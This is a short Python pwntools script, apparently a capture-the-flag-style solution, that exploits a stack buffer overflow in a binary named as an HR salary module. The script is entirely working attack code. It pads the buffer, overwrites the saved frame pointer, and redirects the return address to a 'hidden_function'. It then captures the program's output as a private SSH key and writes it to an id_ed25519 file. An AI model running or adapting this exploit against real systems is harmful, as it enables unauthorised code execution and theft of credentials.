from pwn import *

context.binary = elf = ELF('./files/s3-bucket/hr_systems_salary_module.json')

pr = process()

payload = b'\x00'*0x40 #buffer bytes
payload += b'SAVEDRBP' #overwrite rbp
payload += p64(elf.sym['hidden_function']) #overwrite rip to call hidden_function
pr.sendline(payload)
pr.recvuntil(b'\n\n\n')

priv_key = pr.recvall().decode()

print(priv_key) #print the private key
with open('./files/id_ed25519','w') as file: #save the private key to a file
    file.write(priv_key)